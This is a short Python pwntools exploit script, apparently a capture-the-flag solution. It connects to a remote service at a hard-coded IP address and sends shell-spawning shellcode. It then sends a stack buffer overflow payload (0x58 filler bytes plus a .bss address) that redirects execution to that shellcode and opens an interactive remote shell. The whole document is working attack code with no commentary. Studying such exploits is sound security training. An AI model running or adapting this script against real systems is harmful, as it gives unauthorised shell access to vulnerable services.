from pwn import *

#context(os='linux', arch='amd64', log_level='debug')

context(os='linux',arch='amd64')

r=remote("183.129.189.60",10016)

#r=process('./pwn1')

r.recvuntil(":")

shellcode=asm(shellcraft.sh())

r.sendline(shellcode)

#gdb.attach(r)

bss_adr=0x06010A0

r.recvuntil("Now play your game: ")

payload=(0x50+0x8)*"a"+p64(bss_adr)

r.sendline(payload)

r.interactive()
